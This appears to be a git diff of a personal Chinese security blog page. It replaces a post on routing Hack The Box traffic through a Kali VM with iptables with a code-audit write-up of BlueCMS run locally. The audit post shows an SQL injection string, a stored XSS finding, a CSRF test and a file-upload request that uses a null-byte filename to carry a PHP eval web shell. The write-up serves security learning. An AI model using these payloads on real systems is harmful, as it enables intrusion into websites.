@@ -11,7 +11,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>路由转发实操 |  小张之栈</title>
+      <title>代码审计 |  小张之栈</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/favicon.ico" />
@@ -64,7 +64,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-lyzfsc"
+  id="post-daimashenji"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -76,7 +76,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  路由转发实操
+  代码审计
 </h1>
  
 
@@ -84,11 +84,11 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2024/02/16/lyzfsc/" class="article-date">
-  <time datetime="2024-02-16T15:29:20.000Z" itemprop="datePublished">2024-02-16</time>
+      <a href="/2024/03/12/daimashenji/" class="article-date">
+  <time datetime="2024-03-12T09:21:20.000Z" itemprop="datePublished">2024-03-12</time>
 </a> 
   <div class="article-category">
-    <a class="article-category-link" href="/categories/%E8%B7%AF%E7%94%B1%E8%BD%AC%E5%8F%91/">路由转发</a>
+    <a class="article-category-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
   </div>
   
 <div class="word_count">
@@ -96,7 +96,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">1.5k</span>
+            <span class="post-count">627</span>
         </span>
     </span>
 
@@ -105,7 +105,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">5 分钟</span>
+            <span class="post-count">2 分钟</span>
         </span>
     </span>
 </div>
@@ -120,141 +120,42 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h1 id="0x01-实操原因"><a href="#0x01-实操原因" class="headerlink" title="0x01 实操原因"></a>0x01 实操原因</h1><p>玩htb的时候，kali实在不能再多进程啦，开个bp都卡死，之前我不是想着由物理机去开burpsuite，解放kali嘛，但是失败了，当时burp是抓到了虚拟机里访问目标web的包，但是它作为一个代理，源ip(burp)与目的ip(htb)不在同网段，遗憾放弃；但现在不一样了，我是真的花时间去想这个东西，还真让我找到了</p>
-<h1 id="0x02-过程"><a href="#0x02-过程" class="headerlink" title="0x02 过程"></a>0x02 过程</h1><table>
-<thead>
-<tr>
-<th align="center">系统</th>
-<th align="center">ip</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">windows</td>
-<td align="center">192.168.1.142</td>
-</tr>
-<tr>
-<td align="center">kali</td>
-<td align="center">(NAT模式)192.168.241.3</td>
-</tr>
-<tr>
-<td align="center"></td>
-<td align="center">(openvpn)10.10.16.18</td>
-</tr>
-<tr>
-<td align="center">htb</td>
-<td align="center">10.10.11.6</td>
-</tr>
-</tbody></table>
-<p>三个机子，主机为A，虚拟机kali为B(一定是NAT模式)，hackthebox为C</p>
-<p>我可以直接给物理机下一个openvpn，但我懒</p>
-<p>已知B通过openvpn能访问C；而我A和B属于另一网段，可互相访问；现在B容易卡死，因为主机太垃圾，虚拟机空间不够，所以我想尝试A通过B访问C，这种思路分析一下，那就是个代理技术，B作为代理服务器，感觉有搞头嘞</p>
-<p>但是貌似有更直接的方法，即<strong>路由转发</strong>，补充一点，这里还是涉及到必要的NAT转换</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">window下：</span><br><span class="line">route add 10.0.0.0 mask 255.0.0.0 192.168.241.3 <span class="comment">#流向C的流量，发往kali</span></span><br><span class="line"><span class="comment">#其实是下面这种</span></span><br><span class="line"><span class="comment">#第一条规则告诉主机A，当它试图访问 10.10.11.249 时，数据包应该通过路由到 10.10.16.9(B使用openvpn时分配的ip)。</span></span><br><span class="line">route add 10.10.16.9 mask 255.255.255.255 192.168.241.3(B的ip)</span><br><span class="line"><span class="comment">#第二条规则告诉主机A，当它试图访问 10.10.16.9 时，数据包应该通过路由到 192.168.241.3。</span></span><br><span class="line">route add 10.10.11.249 mask 255.255.255.255 10.10.16.9</span><br><span class="line"></span><br><span class="line">kali下：</span><br><span class="line">sudo sysctl -w net.ipv4.ip_forward=1</span><br><span class="line">iptables -t nat -A POSTROUTING -o &lt;OpenVPN接口&gt; -j MASQUERADE <span class="comment">#接口比如tun0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#下面这几个缺一不可</span></span><br><span class="line"><span class="comment">#将从物理机A到虚拟机B (Kali) 的流量的源IP地址修改为虚拟机B (Kali) 的IP地址，并且确保相关的转发规则</span></span><br><span class="line">iptables -t nat -A POSTROUTING -o tun0 -j MASQUERADE</span><br><span class="line"></span><br><span class="line"><span class="comment">#iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</span></span><br><span class="line">iptables -A FORWARD -i tun0 -o eth0 -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br><span class="line"></span><br><span class="line">iptables -A FORWARD -i eth0 -o tun0 -j ACCEPT</span><br><span class="line"></span><br><span class="line"><span class="comment">#iptables -t nat -L -n -v #查看配置的</span></span><br></pre></td></tr></table></figure>
+  <h1 id="0x01原因"><a href="#0x01原因" class="headerlink" title="0x01原因"></a>0x01原因</h1><p>还是得从代码角度入手，学学看代码吧</p>
+<h1 id="php"><a href="#php" class="headerlink" title="php"></a>php</h1><h2 id="1-bluecms"><a href="#1-bluecms" class="headerlink" title="1.bluecms"></a>1.bluecms</h2><p><strong>环境：phpstudy+bluecms</strong></p>
+<p><img src="/../../../Typora/img111/image-20240312163747689.png"></p>
+<h3 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h3><p><img src="/../../../Typora/img111/image-20240312163952031.png" alt="注册表单部分"></p>
+<p>这里的显然的缺陷就是：</p>
+<p>1.用户名可枚举</p>
+<p>2.任意用户注册</p>
+<p>可能的点：</p>
+<p>1.<strong>二次注入</strong>，即在已有admin用户的情况下，注册admin’；去修改admin’的密码，并以admin的身份登录；<strong>但是这里它处理了，加了个转义符</strong></p>
+<p>2.<strong>sql注入</strong>可以尝试一下，填充后，去会员中心，看看回显</p>
+<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><p>这三段，分别去user、admin表查重用户名，再插入到user表中去</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$db</span>-&gt;getone(<span class="string">&quot;SELECT * FROM &quot;</span>.table(<span class="string">&#x27;user&#x27;</span>).<span class="string">&quot; WHERE user_name=&#x27;<span class="variable">$user_name</span>&#x27;&quot;</span>))&#123;</span><br><span class="line">		showmsg(<span class="string">&#x27;该用户名已存在&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$db</span>-&gt;getone(<span class="string">&quot;SELECT * FROM &quot;</span>.table(<span class="string">&#x27;admin&#x27;</span>).<span class="string">&quot; WHERE admin_name=&#x27;<span class="variable">$user_name</span>&#x27;&quot;</span>))&#123;</span><br><span class="line">		showmsg(<span class="string">&#x27;该用户名已存在&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO &quot;</span>.table(<span class="string">&#x27;user&#x27;</span>).<span class="string">&quot; (user_id, user_name, pwd, email, reg_time, last_login_time) VALUES (&#x27;&#x27;, &#x27;<span class="variable">$user_name</span>&#x27;, md5(&#x27;<span class="variable">$pwd</span>&#x27;), &#x27;<span class="variable">$email</span>&#x27;, &#x27;<span class="variable">$timestamp</span>&#x27;, &#x27;<span class="variable">$timestamp</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure>
 
+<p>它这里用的可是拼接，尝试在email中如下操作</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123@123.com<span class="string">&#x27;,&#x27;</span>12313<span class="string">&#x27;,&#x27;</span>1231<span class="string">&#x27;)&quot;;--+</span></span><br></pre></td></tr></table></figure>
 
+<p>没有</p>
+<h3 id="个人信息"><a href="#个人信息" class="headerlink" title="个人信息"></a>个人信息</h3><h4 id="csrf"><a href="#csrf" class="headerlink" title="csrf"></a>csrf</h4><p><img src="/../../../Typora/img111/image-20240312192713966.png" alt="个人信息表单"></p>
+<p>考虑csrf，先点击确认修改，bp拦截，生成一个csrf poc的文件</p>
+<p>再该浏览器上访问该文件</p>
+<p><img src="/../../../Typora/img111/image-20240312192848059.png" alt="无需多言"></p>
+<h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><p>实际上也有xss存在，在if校验中呢，唯独没有对email做长度的校验，在email处写一个基本的&lt;script&gt;，每次访问都可以触发，是一个存储性xss</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE &quot;</span>.<span class="title function_ invoke__">table</span>(<span class="string">&#x27;user&#x27;</span>).<span class="string">&quot; SET birthday = &#x27;<span class="subst">$birthday</span>&#x27;, sex = &#x27;<span class="subst">$sex</span>&#x27;, face_pic = &#x27;<span class="subst">$face_pic</span>&#x27;, email = &#x27;<span class="subst">$email</span>&#x27;, msn = &#x27;<span class="subst">$msn</span>&#x27;, qq = &#x27;<span class="subst">$qq</span>&#x27;,&quot;</span> .</span><br><span class="line">			<span class="string">&quot; mobile_phone = &#x27;<span class="subst">$mobile_phone</span>&#x27;, office_phone = &#x27;<span class="subst">$office_phone</span>&#x27;, home_phone = &#x27;<span class="subst">$home_phone</span>&#x27;, address=&#x27;<span class="subst">$address</span>&#x27; WHERE user_id = &quot;</span>.<span class="title function_ invoke__">intval</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>]);</span><br><span class="line">	<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A POSTROUTING -o tun0 -j MASQUERADE</span><br></pre></td></tr></table></figure>
+<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>有后缀检测、MIME检测，用户头像一栏其实是给的路径</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;face_pic2&quot;</span>; filename=<span class="string">&quot;get.php%00.jpg&quot;</span></span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">@<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-<blockquote>
-<ul>
-<li><p><code>-t nat</code>: 指定规则表为 “nat” 表，即网络地址转换表。</p>
-</li>
-<li><p><code>-A POSTROUTING</code>: 在 “nat” 表的 POSTROUTING 链中追加规则，即对于从本地网络流出的数据包进行处理。</p>
-</li>
-<li><p><code>-o tun0</code>: 指定出口接口为 <code>tun0</code>，即数据包将通过这个接口离开本地网络。</p>
-</li>
-<li><p><code>-j MASQUERADE</code>: 使用 <code>MASQUERADE</code> 目标，将数据包的源地址替换为本地网络接口的地址，使其看起来像是从主机直接流出的</p>
-<p>为通过 <code>tun0</code> 接口流出的数据包进行地址伪装，使得它们看起来像是直接从主机发出的。这通常用于隐藏内部网络结构</p>
-</li>
-</ul>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A FORWARD -i tun0 -o eth0 -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>-A FORWARD: 在 “filter” 表的 FORWARD 链中追加规则，即用于处理转发的数据包</p>
-<p>-i tun0 -o eth0: 数据包从 tun0 接口进入，经过 eth0 接口流出。</p>
-<p>-m state –state RELATED,ESTABLISHED: 匹配已建立连接或与已建立连接相关的数据包。</p>
-<p>-j ACCEPT: 允许匹配的数据包通过</p>
-<p>#↑允许已建立连接或相关的数据包在 tun0 和 eth0 之间进行转发</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A FORWARD -i eth0 -o tun0 -j ACCEPT</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<ul>
-<li><code>-A FORWARD</code>: 在 “filter” 表的 FORWARD 链中追加规则。</li>
-<li><code>-i eth0 -o tun0</code>: 数据包从 <code>eth0</code> 接口进入，经过 <code>tun0</code> 接口流出。</li>
-<li><code>-j ACCEPT</code>: 允许所有匹配的数据包通过。</li>
-</ul>
-<p>这条规则的作用是允许所有从 <code>eth0</code> 到 <code>tun0</code> 的数据包进行转发。</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20240216171240079.png" alt="物理机ping成功"></p>
-<p>可行，这种方式解决了虚拟机内存不够的问题，进程多了容易卡死，这个应该就可以用我物理机的burp去抓包了</p>
-<p>只需要在虚拟机里设置一下http，ip为虚拟机<strong>网关ip</strong>，而物理机的bp(点击选择特定地址时，会有选项的)监听即可</p>
-<p>总结一下，windows机去添加两条路由，告诉数据包应该怎么走；kali做ip转发，以及源ip转换</p>
-<p>burp抓包的话，监听地址为vmet8的网关，虚拟机去firefox设置下同名代理，一致即可</p>
-<p>另附bp白名单设置：</p>
-<p>1.Target-&gt;Scope</p>
-<p>2.proxy勾选对应的正则(is in target scope)才会生效</p>
-<p>参考来源：<strong>chatgpt 3.5</strong> (啧，折腾好久)</p>
-<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p>后面我又遇到同样的需求，重复操作时，不能达到这种目的</p>
-<p>那我觉得有必要去深究一下iptables了</p>
-<h2 id="环境与目的"><a href="#环境与目的" class="headerlink" title="环境与目的"></a>环境与目的</h2><table>
-<thead>
-<tr>
-<th align="center">系统</th>
-<th align="center">ip</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">windows</td>
-<td align="center">192.168.1.142</td>
-</tr>
-<tr>
-<td align="center">kali</td>
-<td align="center">(桥接)192.168.1.117</td>
-</tr>
-<tr>
-<td align="center"></td>
-<td align="center">(openvpn)10.10.16.18</td>
-</tr>
-<tr>
-<td align="center">htb</td>
-<td align="center">10.10.11.6</td>
-</tr>
-</tbody></table>
-<p>通信情况：win与kali同网段互通，kali通过openvpn与htb互通</p>
-<p>目的：win能ping通htb</p>
-<p>思路分析：</p>
-<p>目前主机与kali的eth0在同一网段；如果想要ping通kali的tun0网段，只需要在主机路由到tun0即可；关键是ping通htb；</p>
-<p>那就是说通过改源地址和目的地址的方式。</p>
-<p>但这里已经看出来了，kali和主机是桥接模式，不是NAT模式；貌似只能看单纯的流量转发</p>
-<p>而且桥接模式下，kali必须做个代理，不然bp抓不到的，还是用NAT模式吧，一般是监听出口网卡如vmet8</p>
-<h2 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h2><p>NAT表</p>
-<table>
-<thead>
-<tr>
-<th align="center">链</th>
-<th align="center">作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">PREROUTING</td>
-<td align="center">传入时，修改数据包的目的ip地址</td>
-</tr>
-<tr>
-<td align="center">POSTROUTING</td>
-<td align="center">传出时，修改数据包的源ip地址</td>
-</tr>
-<tr>
-<td align="center">OUTPUT</td>
-<td align="center">定义对本地产生的数据包的目的NAT规则</td>
-</tr>
-</tbody></table>
-<p>保存规则</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo iptables-save</span><br><span class="line"><span class="comment">#或，保存为文件</span></span><br><span class="line">sudo iptables-save &gt; /etc/iptables/rules.v4</span><br><span class="line">iptables-restore &lt; /etc/iptables/rules.v4</span><br></pre></td></tr></table></figure>
-
-<p>参考：</p>
-<p>一口linux <a target="_blank" rel="noopener" href="http://t.csdnimg.cn/rnmaB">http://t.csdnimg.cn/rnmaB</a></p>
+<p>上传完成后，名字被强制成*.jpg格式；这里先略过</p>
+<h3 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h3><p>不存在万能用户、万能密码这种</p>
+<p>普通用户错误密码登录是模糊消息提示，可行</p>
+<p>但是admin登录，不管密码对错，暴露了admin账户存在的事实</p>
+<h3 id="新闻发布"><a href="#新闻发布" class="headerlink" title="新闻发布"></a>新闻发布</h3><p>虽然新闻分类不可选，bp拦截可以添加为1，发布成功</p>
+<h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>链接变成了这个</p>
+<p><code>/bluecms-master/news.php?id=1</code></p>
+<p>安装及审计参考 <a target="_blank" rel="noopener" href="http://t.csdnimg.cn/8RDMV">http://t.csdnimg.cn/8RDMV</a></p>
+<p>目录索引开启 <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/435493999">https://zhuanlan.zhihu.com/p/435493999</a></p>
  
       <!-- reward -->
       
@@ -319,12 +220,12 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2024/02/16/lyzfsc/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2024/03/12/daimashenji/" alt="微信分享二维码">
     </div>
 </div>
 
 <div id="share-mask"></div>  
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91/" rel="tag">流量转发</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
 
     </footer>
   </div>
@@ -332,19 +233,10 @@
    
   <nav class="article-nav">
     
+    
       <a href="/2024/03/11/xieyi/" class="article-nav-link">
-        <strong class="article-nav-caption">上一篇</strong>
-        <div class="article-nav-title">
-          
-            协议再探
-          
-        </div>
-      </a>
-    
-    
-      <a href="/2024/02/02/%E6%90%AD%E5%BB%BA-ssrf/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">内网场景搭建</div>
+        <div class="article-nav-title">协议再探</div>
       </a>
     
   </nav>
